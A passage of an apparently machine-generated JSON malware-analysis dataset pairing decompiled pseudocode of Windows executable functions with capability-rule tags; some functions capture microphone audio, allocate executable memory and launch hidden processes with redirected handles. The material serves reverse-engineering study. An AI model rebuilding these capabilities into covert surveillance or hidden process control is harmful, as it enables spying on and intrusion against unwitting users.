        "decompiled_code": "\nuint fcn.0047e850(void)\n\n{\n    int32_t in_EAX;\n    \n    fcn.00403ae4();\n    sub.msacm32.dll_acmStreamConvert(*(in_EAX + 0x104), in_EAX + 0x108, 4);\n    sub.msacm32.dll_acmStreamReset(*(in_EAX + 0x104), 0);\n    *(in_EAX + 0x100) = 0;\n    return *(in_EAX + 300);\n}\n",
        "token_count": 113
    },
    "0047eb20": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0047eb20(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0xec) == '\\0') {\n        *(in_EAX + 0xf8) = param_2;\n    }\n    return;\n}\n",
        "token_count": 69
    },
    "0047ee18": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.0047ee18(uint arg_8h, uint arg_ch)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    uchar *puVar3;\n    uchar *puVar4;\n    \n    puVar1 = *0x4ab0b8;\n    if (*0x4ab0bc == NULL) {\n        puVar1 = sub.kernel32.dll_VirtualAlloc_1(0, 0x1000, 0x1000, 0x40);\n        *puVar1 = *0x4ab0b8;\n        fcn.004030ec();\n        uVar2 = fcn.0047ee10();\n        *(puVar1 + 6) = uVar2;\n        puVar3 = puVar1 + 10;\n        do {\n            puVar4 = puVar3;\n            *puVar4 = 0xe8;\n            uVar2 = fcn.0047ee10();\n            *(puVar4 + 1) = uVar2;\n            *(puVar4 + 5) = *0x4ab0bc;\n            puVar3 = puVar4 + 0xd;\n            *0x4ab0bc = puVar4;\n        } while ((puVar4 + 0xd) - puVar1 < 0xffc);\n    }\n    *0x4ab0b8 = puVar1;\n    puVar3 = *0x4ab0bc;\n    puVar1 = *0x4ab0bc + 5;\n    *0x4ab0bc = *(*0x4ab0bc + 5);\n    *puVar1 = arg_8h;\n    *(puVar3 + 9) = arg_ch;\n    return puVar3;\n}\n",
        "token_count": 386
    },
    "0047eec4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0047eec4(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    uint lpWndClass;\n    code *var_24h;\n    \n    *0x4a4a24 = *0x4a87f8;\n    iVar1 = sub.user32.dll_GetClassInfoA(*0x4a87f8, *0x4a4a38, &lpWndClass);\n    if ((iVar1 == 0) || (var_24h != sub.user32.dll_DefWindowProcA)) {\n        if (iVar1 != 0) {\n            sub.user32.dll_UnregisterClassA(*0x4a4a38, *0x4a87f8);\n        }\n        sub.user32.dll_RegisterClassA(0x4a4a14);\n    }\n    uVar2 = fcn.0040847c(0, *0x4a87f8, 0, 0, 0, 0, 0, 0, 0x80000000);\n    if (arg_8h._2_2_ != 0) {\n        uVar3 = fcn.0047ee18(arg_8h, arg_ch);\n        sub.user32.dll_SetWindowLongA(uVar2, 0xfffffffc, uVar3);\n    }\n    return uVar2;\n}\n",
        "token_count": 311
    },
    "0047f010": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0047f010(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack44;\n    int32_t iStack40;\n    uchar *puStack36;\n    uint uStack32;\n    int32_t iStack28;\n    uint uStack24;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*(in_EAX + 4) == '\\0') {\n        uStack24 = 0x47f131;\n        fcn.0047f2e4();\n    }\n    else {\n        uStack24 = 0x20;\n        uStack32 = *(in_EAX + 0x94);\n        puStack36 = 0x47f03f;\n        iStack28 = param_2;\n        iVar1 = sub.winmm.dll_waveInUnprepareHeader();\n        if (iVar1 == 0) {\n            uVar2 = *(param_2 + 8);\n            if (*(in_EAX + 0xa2) != 0) {\n                puStack36 = 0x47f061;\n                fcn.00402ef0();\n                iStack40 = 0x47f0ad;\n                uStack44 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffd4;\n                puStack36 = &stack0xfffffffc;\n                fcn.004030ec();\n                (**(in_EAX + 0xa0))();\n                *in_FS_OFFSET = uVar2;\n                iStack40 = 0x47f0b4;\n                uStack44 = 0x47f0ac;\n                fcn.00402f0c();\n                return;\n            }\n            *(param_2 + 4) = *(in_EAX + 0xc);\n            *(param_2 + 8) = 0;\n            *(param_2 + 0xc) = 0;\n            *(param_2 + 0x10) = 0;\n            *(param_2 + 0x14) = 0;\n            puStack36 = 0x47f0f2;\n            fcn.00408468();\n            puStack36 = 0x20;\n            uStack44 = *(in_EAX + 0x94);\n            iStack40 = param_2;\n            iVar1 = sub.winmm.dll_waveInPrepareHeader();\n            if (iVar1 == 0) {\n                sub.winmm.dll_waveInAddBuffer(*(in_EAX + 0x94), param_2, 0x20);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 591
    },
    "0047f138": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0047f138(uint param_1, uint *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    uint *puVar4;\n    int32_t aiStack172 [3];\n    uchar *puStack160;\n    uint uStack156;\n    uint uStack152;\n    uint uStack148;\n    uint auStack144 [33];\n    \n    puVar3 = &stack0xffffff70;\n    for (iVar1 = 0x20; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = *param_2;\n        param_2 = param_2 + 1;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = *param_2;\n    if (*(in_EAX + 4) == '\\0') {\n        uStack148 = 0x10004;\n        uStack152 = 0;\n        uStack156 = *(in_EAX + 0x98);\n        puStack160 = &stack0xffffff70;\n        aiStack172[2] = 0;\n        aiStack172[1] = in_EAX + 0x94;\n        aiStack172[0] = 0x47f177;\n        iVar1 = sub.winmm.dll_waveInOpen();\n        if (iVar1 == 0) {\n            for (uVar2 = *(in_EAX + 0x91); uVar2 != 0; uVar2 = uVar2 - 1) {\n                aiStack172[0] = 0x47f18d;\n                fcn.0047f27c();\n            }\n            aiStack172[0] = *(in_EAX + 0x94);\n            iVar1 = sub.winmm.dll_waveInStart();\n            if (iVar1 == 0) {\n                puVar3 = &stack0xffffff54;\n                puVar4 = in_EAX + 0x10;\n                for (iVar1 = 0x20; iVar1 != 0; iVar1 = iVar1 + -1) {\n                    *puVar4 = *puVar3;\n                    puVar3 = puVar3 + 1;\n                    puVar4 = puVar4 + 1;\n                }\n                *puVar4 = *puVar3;\n                *(in_EAX + 4) = 1;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 542
    },
    "0047f218": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0047f218(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (*(in_EAX + 4) != '\\0') {\n        *(in_EAX + 4) = 0;\n        sub.winmm.dll_waveInReset(*(in_EAX + 0x94));\n        sub.winmm.dll_waveInClose(*(in_EAX + 0x94));\n        *(in_EAX + 0x94) = 0;\n        iVar1 = *(*(in_EAX + 8) + 8) + -1;\n        if (-1 < iVar1) {\n            do {\n                fcn.0047ec68();\n                fcn.0047f2e4();\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != -1);\n        }\n    }\n    return;\n}\n",
        "token_count": 188
    },
    "0047f270": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0047f270(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 4) == '\\0') {\n        *(in_EAX + 0xc) = param_2;\n    }\n    return;\n}\n",
        "token_count": 67
    },
    "0047f388": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.0047f388(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack928;\n    uint uStack924;\n    uchar *puStack920;\n    uint lpSecurityAttributes;\n    uint var_380h;\n    uint var_37ch;\n    int32_t hHandle;\n    int32_t var_374h;\n    uint var_368h;\n    uint var_33ch;\n    uint var_338h;\n    int32_t var_330h;\n    int32_t var_32ch;\n    uint var_323h;\n    uint lpFileName;\n    uint var_119h;\n    int32_t hObject;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    puStack920 = 0x47f3a1;\n    cVar1 = fcn.0040a168();\n    if (cVar1 == '\\0') {\n        var_1h._0_1_ = 0;\n    }\n    else {\n        puStack920 = 0x47f3bb;\n        fcn.0040a824();\n        puStack920 = 0x47f3c8;\n        fcn.0040a824();\n        puStack920 = 0x47f3d5;\n        fcn.0040a824();\n        uStack924 = 0x47f577;\n        iStack928 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xfffffc60;\n        puStack920 = &fcn.0047f388::var_1h + 1;\n        fcn.00403ae4();\n        lpSecurityAttributes = 0xc;\n        var_380h = 0;\n        var_37ch = 0xffffffff;\n        var_10h = sub.kernel32.dll_CreateFileA_1\n                            (&fcn.0047f388::lpFileName, 0xc0000000, 3, &fcn.0047f388::lpSecurityAttributes, 4, 0x100, 0)\n        ;\n        if (var_10h == -1) {\n            var_1h._0_1_ = 0;\n            fcn.00404f60();\n        }\n        else {\n            hObject = sub.kernel32.dll_CreateFileA_1\n                                (&fcn.0047f388::var_323h, 0xc0000000, 3, &fcn.0047f388::lpSecurityAttributes, 2, 0x100, \n                                 0);\n            if (hObject == -1) {\n                var_1h._0_1_ = 0;\n                fcn.00404f60();\n            }\n            else {\n                fcn.00403ae4();\n                var_368h = 0x44;\n                var_33ch = 0x101;\n                var_338h._0_2_ = 0;\n                var_32ch = hObject;\n                var_330h = var_10h;\n                iVar2 = sub.kernel32.dll_CreateProcessA\n                                  (0, &fcn.0047f388::var_119h, 0, 0, 0xffffffff, 0x110, 0, 0, &fcn.0047f388::var_368h, \n                                   &fcn.0047f388::hHandle);\n                var_1h._0_1_ = '\\x01' - (iVar2 == 0);\n                if (var_1h != '\\0') {\n                    iVar2 = hHandle;\n                    sub.kernel32.dll_WaitForSingleObject(hHandle, 0xffffffff);\n                    var_8h = hHandle;\n                    var_ch = var_374h;\n                    uVar3 = 0;\n                    *in_FS_OFFSET = iVar2;\n                    if (hObject != 0) {\n                        uVar3 = sub.kernel32.dll_CloseHandle_1(hObject, 0x47f57e);\n                    }\n                    if (var_10h != 0) {\n                        uVar3 = sub.kernel32.dll_CloseHandle_1(var_10h);\n                    }\n                    if (var_ch != 0) {\n                        uVar3 = sub.kernel32.dll_CloseHandle_1(var_ch);\n                    }\n                    if (var_8h != 0) {\n                        uVar3 = sub.kernel32.dll_CloseHandle_1(var_8h);\n                    }\n                    return uVar3;\n                }\n                var_1h._0_1_ = 0;\n                fcn.00404f60();\n            }\n        }\n    }\n    return var_1h;\n}\n",
        "token_count": 1051
    },
    "0047f628": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_40h\n// WARNING: Variable defined which should be unmapped: var_3ch\n// WARNING: Variable defined which should be unmapped: var_48h\n// WARNING: Variable defined which should be unmapped: var_44h\n// WARNING: Variable defined which should be unmapped: var_54h\n// WARNING: Variable defined which should be unmapped: var_50h\n// WARNING: Variable defined which should be unmapped: var_5ch\n// WARNING: Variable defined which should be unmapped: var_58h\n// WARNING: Variable defined which should be unmapped: var_64h\n// WARNING: Variable defined which should be unmapped: var_60h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid __fastcall fcn.0047f628(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint unaff_EBX;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint *in_FS_OFFSET;\n    uchar *var_68h;\n    uint *var_64h;\n    uint32_t var_60h;\n    uint *var_5ch;\n    uint *var_58h;\n    uint *var_54h;\n    uint *var_50h;\n    uint *var_4ch;\n    uint *var_48h;\n    uint32_t var_44h;\n    uint *var_40h;\n    uint32_t var_3ch;\n    uint *var_38h;\n    uint32_t var_34h;\n    uint *var_30h;\n    uint *var_2ch;\n    uint *var_28h;\n    uint *var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uchar *var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    iVar3 = 0xd;\n    do {\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    var_18h = 0x47f647;\n    var_14h = unaff_EDI;\n    var_10h = unaff_ESI;\n    var_ch = unaff_EBX;\n    var_4h = in_EAX;\n    fcn.004058ec();\n    var_1ch = 0x47fbbb;\n    var_20h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0047f628::var_20h;\n    if (var_4h != 0) {\n        var_24h = *0x47fbcc;\n        var_28h = &fcn.0047f628::var_2ch;\n        var_2ch = 0x47f67d;\n        var_18h = &stack0xfffffffc;\n        fcn.0040ee40(var_28h, var_24h);\n        var_2ch = 0x47f688;\n        fcn.00405504();\n        var_2ch = *0x47fbcc;\n        var_30h = &fcn.0047f628::var_30h;\n        var_34h = 0x47f6a6;\n        fcn.0040ee40(var_30h, var_2ch);\n        var_34h = 0x47f6b1;\n        fcn.00405504();\n        var_34h = 0x47f6bd;\n        piVar2 = fcn.00404610();\n        var_34h = 0x47f6c9;\n        (**(*piVar2 + 0x90))();\n        var_34h = 0x47f6d3;\n        (**(*piVar2 + 0x2c))();\n        var_34h = 0x47f6dc;\n        (**(*piVar2 + 0x48))();\n        var_34h = 0x47f6e5;\n        (**(*piVar2 + 0x48))();\n        var_34h = 0x47f6ee;\n        (**(*piVar2 + 0x48))();\n        var_34h = 0x47f6f7;\n        (**(*piVar2 + 0x48))();\n        do {\n            var_24h = 0x47f703;\n            (**(*piVar2 + 0xc))();\n            var_24h = 0x47f70e;\n            fcn.00409a78();\n            var_24h = 0x47f719;\n            fcn.00405504();\n            var_24h = &fcn.0047f628::var_8h;\n            var_28h = 0x47f72a;\n            fcn.00405a48();\n            var_28h = 0x47f73a;\n            fcn.00405964();\n            var_28h = 0x47f747;\n            fcn.00405a48();\n            var_28h = 0x47f756;\n            fcn.004059a4();\n            var_28h = 0x47f761;\n            fcn.00409a78();\n            var_28h = 0x47f76c;\n            fcn.00405504();\n            var_28h = &fcn.0047f628::var_ch;\n            var_2ch = 0x47f77d;\n            fcn.00405a48();\n            var_2ch = 0x47f78d;\n            fcn.00405964();\n            var_2ch = 0x47f79a;\n            fcn.00405a48();\n            var_2ch = 0x47f7a9;\n            fcn.004059a4();\n            var_2ch = 0x47f7b4;\n            fcn.00409a78();\n            var_2ch = 0x47f7bf;\n            fcn.00405504();\n            var_2ch = &fcn.0047f628::var_10h;\n            var_30h = 0x47f7d0;\n            fcn.00405a48();\n            var_30h = 0x47f7e0;\n            fcn.00405964();\n            var_30h = 0x47f7ed;\n            fcn.00405a48();\n            var_30h = 0x47f7fc;\n            fcn.004059a4();\n            var_30h = 0x47f807;\n            fcn.00409a78();\n            var_30h = 0x47f812;\n            fcn.00405504();\n            var_30h = &fcn.0047f628::var_14h;\n            var_34h = 0x47f823;\n            fcn.00405a48();\n            var_34h = 0x47f833;\n            fcn.00405964();\n            var_34h = 0x47f840;\n            fcn.00405a48();\n            var_34h = 0x47f84f;\n            fcn.004059a4();\n            var_34h = 0x47f85a;\n            fcn.00409a78();\n            var_34h = 0x47f862;\n            fcn.00409dd8();\n            var_34h = 0x47f86a;\n            fcn.0047f318();\n            var_34h = 0x47f877;\n            cVar1 = fcn.0047f58c();\n            if (cVar1 == '\\x01') {\n                var_34h = *0x47fc20;\n                var_38h = &fcn.0047f628::var_44h;\n                var_3ch = 0x47f899;\n                fcn.0040ee40(var_38h, var_34h);\n                var_3ch = 0x47f8a4;\n                fcn.00405504();\n                var_3ch = *0x47fc20;\n                var_40h = &fcn.0047f628::var_48h;\n                var_44h = 0x47f8c2;\n                fcn.0040ee40(var_40h, var_3ch);\n                var_44h = 0x47f8cd;\n                fcn.00405504();\n                var_44h = *0x47fc20;\n                var_48h = &fcn.0047f628::var_4ch;\n                var_4ch = 0x47f8eb;\n                fcn.0040ee40(var_48h, var_44h);\n                var_4ch = 0x47f8f6;\n                fcn.00405504();\n            }\n            var_4ch = &fcn.0047f628::var_18h;\n            var_50h = 0x47f907;\n            fcn.00405a48();\n            var_50h = 0x47f917;\n            fcn.00405964();\n            var_50h = 0x47f924;\n            fcn.00405a48();\n            var_50h = 0x47f933;\n            fcn.004059a4();\n            var_50h = 0x47f93c;\n            (**(*piVar2 + 0x48))();\n            var_50h = 0x47f947;\n            fcn.00409a78();\n            if (var_50h == NULL) {\n                var_50h = 0x47f95e;\n                cVar1 = fcn.0047f58c();\n                if (cVar1 == '\\x01') {\n                    var_50h = *0x47fc20;\n                    var_54h = &fcn.0047f628::var_54h;\n                    var_58h = 0x47f980;\n                    fcn.0040ee40(var_54h, var_50h);\n                    var_58h = 0x47f98b;\n                    fcn.00405504();\n                    var_58h = *0x47fc20;\n                    var_5ch = &fcn.0047f628::var_58h;\n                    var_60h = 0x47f9a9;\n                    fcn.0040ee40(var_5ch, var_58h);\n                    var_60h = 0x47f9b4;\n                    fcn.00405504();\n                    var_60h = *0x47fc20;\n                    var_64h = &fcn.0047f628::var_5ch;\n                    var_68h = 0x47f9d2;\n                    fcn.0040ee40(var_64h, var_60h);\n                    var_68h = 0x47f9dd;\n                    fcn.00405504();\n                }\n                var_50h = 0x47f9ea;\n                fcn.00405504();\n                var_50h = &fcn.0047f628::var_1ch;\n                var_54h = 0x47f9fb;\n                fcn.00405a48();\n                var_54h = 0x47fa0b;\n                fcn.00405964();\n                var_54h = 0x47fa18;\n                fcn.00405a48();\n                var_54h = 0x47fa27;\n                fcn.004059a4();\n                var_54h = *param_2;\n                var_58h = var_24h;\n                var_5ch = 0x47fc50;\n                var_60h = var_8h;\n                var_64h = 0x47fc50;\n                var_68h = var_18h;\n                fcn.00405800(0x47fc5c, var_20h, 0x47fc50, var_10h, 0x47fc50, var_14h, 0x47fc50, var_1ch, 0x47fc50, \n                             var_ch, 0x47fc50);\n            }\n            else {\n                var_50h = 0x47fa87;\n                cVar1 = fcn.0047f58c();\n                if (cVar1 == '\\x01') {\n                    var_50h = *0x47fc20;\n                    var_54h = &fcn.0047f628::var_60h;\n                    var_58h = 0x47faa9;\n                    fcn.0040ee40(var_54h, var_50h);\n                    var_58h = 0x47fab4;\n                    fcn.00405504();\n                    var_58h = *0x47fc20;\n                    var_5ch = &fcn.0047f628::var_64h;\n                    var_60h = 0x47fad2;\n                    fcn.0040ee40(var_5ch, var_58h);\n                    var_60h = 0x47fadd;\n                    fcn.00405504();\n                    var_60h = *0x47fc20;\n                    var_64h = &fcn.0047f628::var_68h;\n                    var_68h = 0x47fafb;\n                    fcn.0040ee40(var_64h, var_60h);\n                    var_68h = 0x47fb06;\n                    fcn.00405504();\n                }\n                var_50h = &fcn.0047f628::var_1ch;\n                var_54h = 0x47fb17;\n                fcn.00405a48();\n                var_54h = 0x47fb27;\n                fcn.00405964();\n                var_54h = 0x47fb34;\n                fcn.00405a48();\n                var_54h = 0x47fb43;\n                fcn.004059a4();\n                var_54h = *param_2;\n                var_58h = var_24h;\n                var_5ch = 0x47fc50;\n                var_60h = var_8h;\n                var_64h = 0x47fc50;\n                var_68h = var_18h;\n                fcn.00405800(0x47fc5c, var_20h, 0x47fc50, var_14h, 0x47fc50, var_10h, 0x47fc50, var_1ch, 0x47fc50, \n                             var_ch, 0x47fc50);\n            }\n            iVar3 = (**(*piVar2 + 0x14))();\n        } while (iVar3 != 0);\n    }\n    *in_FS_OFFSET = var_20h;\n    var_18h = 0x47fbc2;\n    var_1ch = 0x47fbba;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 3502
    },
    "00481400": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00481400(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStackY528;\n    uint uStack520;\n    uint uStack516;\n    uchar *puStack512;\n    uint uStack508;\n    uint uStack504;\n    uchar *puStack500;\n    uint var_1e0h;\n    uint var_1dch;\n    uint var_1d8h;\n    uint var_1d4h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack500 = &stack0xfffffffc;\n    puStack512 = &stack0xfffffffc;\n    uStack504 = 0x481577;\n    uStack508 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffe04;\n    uStack516 = 0x48153b;\n    uStack520 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffdf8;\n    fcn.0040546c();\n    fcn.00480138();\n    fcn.00405738();\n    fcn.00403760();\n    fcn.00480138(0x80);\n    fcn.00405738();\n    uStackY528 = fcn.004058fc();\n    sub.kernel32.dll_SetFileAttributesA();\n    fcn.004034e4();\n    fcn.0040304c();\n    while( true ) {\n        fcn.00403aac();\n        cVar1 = fcn.0040304c();\n        if (cVar1 != '\\0') break;\n        fcn.00403cb4();\n        fcn.00403d20();\n        fcn.0040304c();\n        uStackY528 = 0x4815ac;\n        fcn.00405800();\n    }\n    fcn.00403908();\n    fcn.0040304c();\n    fcn.00409a78();\n    fcn.00405504();\n    fcn.004054c0();\n    *in_FS_OFFSET = uStackY528;\n    *in_FS_OFFSET = uStack516;\n    uStack508 = 0x48157e;\n    puStack512 = 0x481569;\n    fcn.00405490();\n    puStack512 = 0x481576;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 511
    },
    "00481b94": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00481b94(void)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_fffffeb8;\n    uint uVar5;\n    int32_t iStack304;\n    uint uStack300;\n    uchar *puStack296;\n    uint var_114h;\n    uint lpszFile;\n    uint hDrop;\n    uint hMem;\n    \n    puStack296 = &stack0xfffffffc;\n    uStack300 = 0x481c74;\n    iStack304 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack304;\n    fcn.0040546c();\n    fcn.0047e684();\n    iVar1 = fcn.0047e578();\n    if (iVar1 != 0) {\n        uVar2 = sub.kernel32.dll_GlobalLock(iVar1);\n        uVar5 = uVar2;\n        iVar3 = sub.shell32.dll_DragQueryFileA(uVar2, 0xffffffff, 0, 0);\n        if (-1 < iVar3 + -1) {\n            do {\n                uVar5 = uVar2;\n                sub.shell32.dll_DragQueryFileA();\n                iVar4 = fcn.0040a764();\n                if (iVar4 != 0) {\n                    fcn.00405664(*in_EAX);\n                    uVar5 = 0x481c8c;\n                    fcn.00405800();\n                }\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n        sub.kernel32.dll_GlobalUnlock(iVar1, uVar5);\n        in_stack_fffffeb8 = iVar1;\n    }\n    *in_FS_OFFSET = in_stack_fffffeb8;\n    fcn.0040546c(0x481c7b);\n    return;\n}\n",
        "token_count": 427
    },
    "004820e8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004820e8(int32_t arg_8h, uint arg_ch, uint noname_2, uint noname_3, uint noname_4, int32_t *arg_1ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x482276;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    fcn.00406858(arg_1ch[2]);\n    iVar1 = fcn.004066a4();\n    if (arg_1ch[3] < 1) {\n        if (-1 < iVar1) {\n            iVar2 = iVar1 + 1;\n            do {\n                fcn.0041184c();\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n    }\n    else if (-1 < iVar1) {\n        iVar2 = iVar1 + 1;\n        do {\n            fcn.0041184c();\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    if (*(arg_8h + 4) != NULL) {\n        (**(**(arg_8h + 4) + 0x38))();\n    }\n    if (arg_1ch[3] < 1) {\n        iVar2 = 0;\n        if (-1 < iVar1) {\n            iVar1 = iVar1 + 1;\n            do {\n                if ((*(*arg_1ch + iVar2 * 0x10) & 0x4000) == 0x4000) {\n                    fcn.0041184c();\n                }\n                iVar2 = iVar2 + 1;\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != 0);\n        }\n    }\n    else {\n        iVar2 = 0;\n        if (-1 < iVar1) {\n            iVar1 = iVar1 + 1;\n            do {\n                if ((*(*arg_1ch + iVar2 * 0x10) & 0x4000) == 0x4000) {\n                    fcn.0041184c();\n                }\n                iVar2 = iVar2 + 1;\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != 0);\n        }\n    }\n    fcn.00406858(0);\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x48227d;\n    uStack40 = 0x482275;\n    fcn.00406864();\n    return;\n}\n",
        "token_count": 634
    },
    "004824bc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
